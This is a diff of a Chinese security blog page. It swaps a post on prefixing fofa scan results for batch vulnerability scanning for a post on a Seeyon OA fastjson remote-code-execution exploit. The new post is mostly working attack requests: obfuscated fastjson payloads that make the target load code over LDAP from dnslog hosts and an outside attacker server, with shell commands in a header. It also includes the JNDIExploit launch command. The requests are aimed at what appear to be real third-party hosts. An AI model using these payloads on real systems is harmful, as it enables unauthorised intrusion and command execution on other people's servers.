@@ -20,24 +20,24 @@
     var CONFIG = {"hostname":"ithedogl.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="《黑暗之魂3》《只狼》《神界原罪2》《DMC鬼泣》">
+  <meta name="description" content="公者千古！我们都是瞎子！">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PY学习-fofa导出数据添加http或https">
-<meta property="og:url" content="https://ithedogl.github.io/2021/09/08/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/index.html">
+<meta property="og:title" content="致远OA-fastjson-rce回显">
+<meta property="og:url" content="https://ithedogl.github.io/2021/09/09/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/index.html">
 <meta property="og:site_name" content="沉沦">
-<meta property="og:description" content="《黑暗之魂3》《只狼》《神界原罪2》《DMC鬼泣》">
+<meta property="og:description" content="公者千古！我们都是瞎子！">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://ithedogl.github.io/images/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/image-20210908170308123.png">
-<meta property="og:image" content="https://ithedogl.github.io/images/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/image-20210908171201001.png">
-<meta property="og:image" content="https://ithedogl.github.io/images/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/image-20210908171351024.png">
-<meta property="article:published_time" content="2021-09-08T08:56:32.628Z">
-<meta property="article:modified_time" content="2021-09-08T09:19:20.944Z">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/image-20210909171916791.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/image-20210909172138193.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/image-20210909172446201.png">
+<meta property="article:published_time" content="2021-09-09T09:03:23.972Z">
+<meta property="article:modified_time" content="2021-09-09T09:31:39.845Z">
 <meta property="article:author" content="thedog">
-<meta property="article:tag" content="脚本编写">
+<meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://ithedogl.github.io/images/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/image-20210908170308123.png">
+<meta name="twitter:image" content="https://ithedogl.github.io/images/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/image-20210909171916791.png">
 
-<link rel="canonical" href="https://ithedogl.github.io/2021/09/08/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/">
+<link rel="canonical" href="https://ithedogl.github.io/2021/09/09/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/">
 
 
 <script id="page-configurations">
@@ -50,7 +50,7 @@
   };
 </script>
 
-  <title>PY学习-fofa导出数据添加http或https | 沉沦</title>
+  <title>致远OA-fastjson-rce回显 | 沉沦</title>
   
 
 
@@ -183,7 +183,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://ithedogl.github.io/2021/09/08/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/">
+    <link itemprop="mainEntityOfPage" href="https://ithedogl.github.io/2021/09/09/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -196,7 +196,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          PY学习-fofa导出数据添加http或https
+          致远OA-fastjson-rce回显
         </h1>
 
         <div class="post-meta">
@@ -207,7 +207,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2021-09-08 16:56:32 / 修改时间：17:19:20" itemprop="dateCreated datePublished" datetime="2021-09-08T16:56:32+08:00">2021-09-08</time>
+              <time title="创建时间：2021-09-09 17:03:23 / 修改时间：17:31:39" itemprop="dateCreated datePublished" datetime="2021-09-09T17:03:23+08:00">2021-09-09</time>
             </span>
 
           
@@ -219,13 +219,13 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2021/09/08/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/09/08/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/" itemprop="commentCount"></span>
+    <a title="valine" href="/2021/09/09/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/09/09/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/" itemprop="commentCount"></span>
     </a>
   </span>
   
   
-            <div class="post-description">《黑暗之魂3》《只狼》《神界原罪2》《DMC鬼泣》</div>
+            <div class="post-description">公者千古！我们都是瞎子！</div>
 
         </div>
       </header>
@@ -236,17 +236,24 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>使用fofa搜索工具导出来的结果如下图，有些资产并没有http或https前缀，批量扫漏洞的时候格式不符合要求，就想着写个py添加前缀。</p>
-<p><img src="/../../../../images/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/image-20210908170308123.png" alt="image-20210908170308123"></p>
-<p>py内容如下，大概原理就是挨个读取每一行，存在http的就跳过，443的就去掉然后添加https前缀，其他就添加http，然后重新生成添加完前缀的fofa.txt</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#python3 .\fofa.py .\xxx.txt</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">#open(&quot;C:\\Users\i\Desktop\CVE-2021-26084_Confluence-main\s.txt&quot;, &#39;w+&#39;).close()   #清空文本，没有就创建</span><br><span class="line">open(&quot;fofa.txt&quot;, &#39;w+&#39;).close()</span><br><span class="line"></span><br><span class="line">def check(hosts):</span><br><span class="line">    #res &#x3D; open(&#39;C:\\Users\i\Desktop\CVE-2021-26084_Confluence-main\s.txt&#39;, &#39;r+&#39;)</span><br><span class="line">    res &#x3D; open(&#39;fofa.txt&#39;, &#39;r+&#39;)</span><br><span class="line">    try:</span><br><span class="line">        if &quot;http&quot; in hosts:</span><br><span class="line">            res.seek(0, 2)	#2代表从末尾算起，0代表偏移0个单位</span><br><span class="line">            res.write(hosts+&quot;\n&quot;)</span><br><span class="line">            res.close()</span><br><span class="line">            pass</span><br><span class="line">        elif &quot;443&quot; in hosts:</span><br><span class="line">            newre1 &#x3D; &quot;https:&#x2F;&#x2F;&quot; + hosts.replace(&quot;:443&quot;,&quot;&quot;)</span><br><span class="line">            res.seek(0, 2)</span><br><span class="line">            res.write(newre1+&quot;\n&quot;)</span><br><span class="line">            res.close()</span><br><span class="line">            pass</span><br><span class="line">        else:</span><br><span class="line">            newre&#x3D;&quot;http:&#x2F;&#x2F;&quot;+hosts</span><br><span class="line">            res.seek(0, 2)</span><br><span class="line">            res.write(newre+&quot;\n&quot;)</span><br><span class="line">            res.close()</span><br><span class="line">            pass</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;&#123;&#125;无法访问&quot;.format(hosts))</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    hostfile&#x3D;sys.argv[1]</span><br><span class="line">    hf&#x3D;open(hostfile,&#39;r&#39;)</span><br><span class="line">    for host in hf.readlines():</span><br><span class="line">        check(host.strip(&#39;\n&#39;))</span><br><span class="line">    hf.close()</span><br></pre></td></tr></table></figure>
+        <h2 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">V7.1、V7.1SP1</span><br><span class="line">V7.0、V7.0SP1、V7.0SP2、V7.0SP3</span><br><span class="line">V6.1、V6.1SP1、V6.1SP2</span><br><span class="line">V6.0、V6.0SP1</span><br><span class="line">V5.6、V5.6SP1</span><br></pre></td></tr></table></figure>
+
+<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>第一种</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;main.do?method&#x3D;changeLocale HTTP&#x2F;1.1</span><br><span class="line">Host: 223.199.152.165:8088</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko&#x2F;20100101 Firefox&#x2F;47.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Cookie: JSESSIONID&#x3D;5CC67B9F2061656D0529AB3208F7CEA3</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">cmd: dir</span><br><span class="line">Content-Length: 694</span><br><span class="line"></span><br><span class="line">_json_params&#x3D;&#123;&quot;name&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073&quot;,&quot;\u0076\u0061\u006c&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;&#125;,&quot;x&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;,&quot;\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065&quot;:&quot;ldap:&#x2F;&#x2F;t7hfci.dnslog.cn&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/image-20210909171916791.png" alt="image-20210909171916791"></p>
+<p>第二种fofa上找了不少目标，感觉命中极少</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;sursenServlet HTTP&#x2F;1.1</span><br><span class="line">Host: oa.ydysj.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Length: 950</span><br><span class="line">cmd: whoami</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">sursenData&#x3D;%7B%22name%22%3A%7B%22%5Cu0040%5Cu0074%5Cu0079%5Cu0070%5Cu0065%22%3A%22%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu002e%5Cu006c%5Cu0061%5Cu006e%5Cu0067%5Cu002e%5Cu0043%5Cu006c%5Cu0061%5Cu0073%5Cu0073%22%2C%22%5Cu0076%5Cu0061%5Cu006c%22%3A%22%5Cu0063%5Cu006f%5Cu006d%5Cu002e%5Cu0073%5Cu0075%5Cu006e%5Cu002e%5Cu0072%5Cu006f%5Cu0077%5Cu0073%5Cu0065%5Cu0074%5Cu002e%5Cu004a%5Cu0064%5Cu0062%5Cu0063%5Cu0052%5Cu006f%5Cu0077%5Cu0053%5Cu0065%5Cu0074%5Cu0049%5Cu006d%5Cu0070%5Cu006c%22%7D%2C%22x%22%3A%7B%22%5Cu0040%5Cu0074%5Cu0079%5Cu0070%5Cu0065%22%3A%22%5Cu0063%5Cu006f%5Cu006d%5Cu002e%5Cu0073%5Cu0075%5Cu006e%5Cu002e%5Cu0072%5Cu006f%5Cu0077%5Cu0073%5Cu0065%5Cu0074%5Cu002e%5Cu004a%5Cu0064%5Cu0062%5Cu0063%5Cu0052%5Cu006f%5Cu0077%5Cu0053%5Cu0065%5Cu0074%5Cu0049%5Cu006d%5Cu0070%5Cu006c%22%2C%22%5Cu0064%5Cu0061%5Cu0074%5Cu0061%5Cu0053%5Cu006f%5Cu0075%5Cu0072%5Cu0063%5Cu0065%5Cu004e%5Cu0061%5Cu006d%5Cu0065&quot;:&quot;ldap:&#x2F;&#x2F;dwz227.dnslog.cn&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/image-20210909172138193.png" alt="image-20210909172138193"></p>
+<h2 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h2><p>feihong-cs回显项目<a target="_blank" rel="noopener" href="https://github.com/feihong-cs/JNDIExploit">https://github.com/feihong-cs/JNDIExploit</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -p 0909 -i 23.91.97.29</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src="/../../../../images/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/image-20210908171201001.png" alt="image-20210908171201001"></p>
-<p>效果</p>
-<p><img src="/../../../../images/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/image-20210908171351024.png" alt="image-20210908171351024"></p>
-<p>当然还有些重复，可以用excel的数据-删除重复项</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;main.do?method&#x3D;changeLocale HTTP&#x2F;1.1</span><br><span class="line">Host: 223.199.152.165:8088</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko&#x2F;20100101 Firefox&#x2F;47.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Cookie: JSESSIONID&#x3D;5CC67B9F2061656D0529AB3208F7CEA3</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">cmd: whoami</span><br><span class="line">Content-Length: 711</span><br><span class="line"></span><br><span class="line">_json_params&#x3D;&#123;&quot;name&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073&quot;,&quot;\u0076\u0061\u006c&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;&#125;,&quot;x&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;,&quot;\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065&quot;:&quot;ldap:&#x2F;&#x2F;23.91.97.29:1389&#x2F;Basic&#x2F;TomcatEcho&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/%E8%87%B4%E8%BF%9COA-fastjson-rce%E5%9B%9E%E6%98%BE/image-20210909172446201.png" alt="image-20210909172446201"></p>
 
     </div>
 
@@ -256,7 +263,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag"># 脚本编写</a>
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"># 漏洞复现</a>
           </div>
 
         
@@ -265,13 +272,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/08/28/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/" rel="prev" title="Exchange ProxyShell RCE漏洞">
-      <i class="fa fa-chevron-left"></i> Exchange ProxyShell RCE漏洞
+    <a href="/2021/09/08/PY%E5%AD%A6%E4%B9%A0-cve-2021-26084%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC/" rel="prev" title="PY学习-cve-2021-26084批量验证脚本">
+      <i class="fa fa-chevron-left"></i> PY学习-cve-2021-26084批量验证脚本
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2021/09/08/PY%E5%AD%A6%E4%B9%A0-cve-2021-26084%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC/" rel="next" title="PY学习-cve-2021-26084批量验证脚本">
-      PY学习-cve-2021-26084批量验证脚本 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -331,6 +335,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8C%83%E5%9B%B4"><span class="nav-number">1.</span> <span class="nav-text">范围</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81"><span class="nav-number">2.</span> <span class="nav-text">验证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9E%E6%98%BE"><span class="nav-number">3.</span> <span class="nav-text">回显</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
